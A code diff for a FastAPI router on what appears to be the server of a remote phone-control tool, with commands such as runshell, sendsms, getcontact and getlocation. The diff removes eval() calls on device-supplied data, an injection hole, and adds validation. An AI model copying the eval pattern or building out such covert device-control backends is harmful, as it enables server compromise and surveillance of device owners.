@@ -1,11 +1,15 @@
 from datetime import datetime
 from fastapi import APIRouter, File, UploadFile, Depends
-from pydantic import BaseModel
+from pydantic import BaseModel, validator
 from fastapi.responses import JSONResponse, StreamingResponse
 from fastapi.encoders import jsonable_encoder
 from db.database import command_db, tear_drive
 from routers.client import client
+from routers.command.parser import parse_command_response
 from fastapi_jwt_auth import AuthJWT
+import logging
+
+logger = logging.getLogger(__name__)
 
 router = APIRouter(
     prefix="/command",
@@ -27,6 +31,18 @@ class command_info(BaseModel):
     response: str = None
     date: datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     response_date: str = None
+    
+    @validator('device_id')
+    def validate_device_id(cls, v):
+        if not v or len(v) > 256:
+            raise ValueError('Invalid device_id')
+        return v
+    
+    @validator('command')
+    def validate_command(cls, v):
+        if not v or len(v) > 256:
+            raise ValueError('Invalid command')
+        return v
 
 
 class complete(BaseModel):
@@ -80,54 +96,45 @@ async def get_all_clients(complete: complete):
 
 @router.get("/response/{command_key}")
 async def get_response(command_key: str, Authorize: AuthJWT = Depends()):
+    """
+    Get command response with three-layer safe parsing:
+    1. String sanitization + json.loads()
+    2. ast.literal_eval() fallback (safe, literals only)
+    3. Strict Pydantic model validation
+
+    Never returns raw/unstructured data for known command types.
+    Never uses eval(). RCE-safe by design.
+    """
     Authorize.jwt_required()
-    singleResponse = ["runshell", "sendsms", "changewallpaper", "makecall"]
-    response = command_db.get(key=command_key)
-    if response["success"]:
-        if response["command"] in singleResponse:
-            return JSONResponse(
-                {"success": True, "response": response["response"].split("\n")}
-            )
-        elif response["command"] == "listfile":
-            files = eval(response["response"])["files"]
-            return JSONResponse({"success": True, "response": files})
-        elif response["command"] == "getlocation":
-            return JSONResponse(
-                {"success": True, "response": eval(response["response"])["location"]}
-            )
-        elif response["command"] == "getservices":
-            return JSONResponse(
-                {"success": True, "response": eval(response["response"])["services"]}
-            )
-        elif response["command"] == "getapps":
-            return JSONResponse(
-                {
-                    "success": True,
-                    "response": eval(response["response"])["installed_apps"],
-                }
-            )
-        elif response["command"] == "getcontact":
-            contact = eval(response["response"])["contact"]
-            data = eval(str(contact)).items()
-            return JSONResponse({"success": True, "response": list(data)})
-        elif response["command"] == "getfile":
-            return JSONResponse(
-                {"success": True, "response": eval(response["response"])["filename"]}
-            )
-        else:
-            new_response = []
-            data = eval(response["response"])
-            header = list(data[list(data.keys())[0]][0].keys())
-            response = data[list(data.keys())[0]]
-            for i in response:
-                new_response.append(list(i.values()))
-            return JSONResponse(
-                {"success": True, "header": header, "response": new_response}
-            )
-    else:
+    record = command_db.get(key=command_key)
+
+    if not record or not record.get("success"):
         return JSONResponse(
             {"success": False, "message": "this command did not send any response"}
         )
+
+    command = record.get("command", "unknown")
+    raw_response = record.get("response", "")
+
+    result = parse_command_response(command, raw_response)
+
+    if not result["success"]:
+        return JSONResponse(
+            {
+                "success": False,
+                "command": command,
+                "message": result.get("error", "Failed to parse response"),
+            },
+            status_code=422,
+        )
+
+    return JSONResponse(
+        {
+            "success": True,
+            "command": command,
+            "response": result["response"],
+        }
+    )
 
 
 @router.post("/upload")
